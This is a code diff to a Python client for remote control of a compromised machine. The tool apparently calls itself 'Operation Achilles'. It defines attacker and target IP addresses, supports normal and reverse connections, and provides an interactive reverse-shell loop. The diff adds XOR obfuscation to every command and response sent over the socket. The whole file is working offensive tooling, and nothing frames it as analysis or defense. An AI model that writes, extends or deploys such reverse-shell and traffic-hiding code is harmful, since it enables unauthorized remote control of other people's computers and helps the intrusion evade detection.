@@ -4,10 +4,10 @@ from time import sleep
 ATTACKER_IP = "0.0.0.0"
 ATTACKER_PORT = 22
 
-TARGET_IP = "10.0.0.14"
+TARGET_IP = "192.168.1.89"
 TARGET_PORT = 8989
 
-KEY=b"Op3r4t1on_4ch1ll3s"
+KEY=0xAB
 
 def connection():
     # | 1. dst addr | 2. skt | 3. connect | 4. sendall
@@ -21,14 +21,16 @@ def connection():
         if status == 0:
             print("[*] Connection established")
             RUN = False
+
+            response = cipher(skt.recv(1024)).decode("utf-8")
+            print(f" > {response}")
+            mainMenu(skt)
         else:
             sleep(5)
             print(f"[!] Could not connect to server {status}")
             skt.close()
 
-    response = skt.recv(1024).decode("utf-8")
-    print(f" > {response}")
-    mainMenu(skt)
+
 
 
 def reverseConnection():
@@ -46,7 +48,7 @@ def reverseConnection():
         connID, addr = sktrec.accept()
         print(f"[*] Connection established with {addr}")
 
-        response = connID.recv(1024).decode("utf-8")  #
+        response = cipher(connID.recv(1024)).decode("utf-8")  #
         print(f" > {response}")
 
         mainMenu(connID)
@@ -68,7 +70,7 @@ def mainMenu(skt):
             enc_cmd=cipher(command.encode("utf-8"))
             skt.sendall(enc_cmd)
 
-            response = skt.recv(1024).decode("utf-8")
+            response = cipher(skt.recv(1024)).decode("utf-8")
             print(f" > {response}")
             reverseShell(skt)
             print("[*] Back to menu")
@@ -86,13 +88,13 @@ def mainMenu(skt):
 def reverseShell(skt):
     skt.settimeout(0.2)
     try:
-        print(skt.recv(1024).decode("utf-8"), end="")
+        print(cipher(skt.recv(1024)).decode("utf-8"), end="")
     except:
         pass
     skt.settimeout(None)
     while True:
-        command = input("")
-        enc_cmd = (command + "\n").encode("utf-8")
+        command = input("")+"\n"
+        enc_cmd = cipher(command.encode("utf-8"))
         skt.sendall(enc_cmd)
         sleep(1)
         print("\033[2K", end='\r')
@@ -102,8 +104,8 @@ def reverseShell(skt):
                 data = skt.recv(4096)
                 if not data:
                     break
-                if data.decode("utf-8") != (command + "\n"):
-                    print(data.decode("utf-8"), end="", flush=True)
+
+                print(cipher(data).decode("utf-8"), end="", flush=True)
             except socket.timeout:
                 break
 
@@ -112,17 +114,16 @@ def reverseShell(skt):
             break
     skt.settimeout(None)
 
-def cipher(message):
-    return message
 # def cipher(message):
-#     key = KEY
-#     key_len = len(key)
-#
-#     # for i in range(key_len):
-#     #     message[i] = message[i]^key[i%key_len]
-#     #
-#     # return message
-#     return bytes([message[i] ^ key[i % key_len] for i in range(len(message))])
+#     return message
+def cipher(message):
+    key = KEY
+
+    # for i in range(key_len):
+    #     message[i] = message[i]^key[i%key_len]
+    #
+    # return message
+    return bytes([message[i] ^ key for i in range(len(message))])
 
 def main():
     print("Welcome Achilles!\n [1] Normal connection\n [2] Reverse connection")
